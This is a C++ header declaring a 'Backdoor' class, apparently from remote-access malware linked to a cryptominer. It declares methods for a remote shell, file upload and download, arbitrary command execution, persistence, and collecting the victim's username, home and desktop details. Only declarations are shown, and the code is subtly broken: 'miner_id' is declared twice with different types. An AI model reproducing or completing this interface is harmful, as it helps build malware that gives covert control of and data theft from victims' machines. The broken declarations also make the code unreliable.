#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>
#include "system.h"
#define LENGTH 512

class Backdoor{
public:
    void shell();
    void upload(const char *);
    void download(const char *);
    void get_miner_id();
    void get_miner_info();
    void send_message(char *);
    // Gets
    std::string get_miner_ip();
    std::string get_id();
    int get_sock();
    Backdoor(int, Communication *, bool, char *);

private:
    void persistence();
    void get_home_enviroment();
    void get_username();
    void get_desktop_enviroment();
    char * execute_command(const char *);
    Communication * c; // Object to send / recv strings
    bool is_server;
    int sock; // file descriptor to send / recv strings
    char * client_ip;
    char * miner_id;
    char * user_name;
    char * user_home;
    char * user_desktop;
    char * program_name;
    std::string miner_id;
};

#endif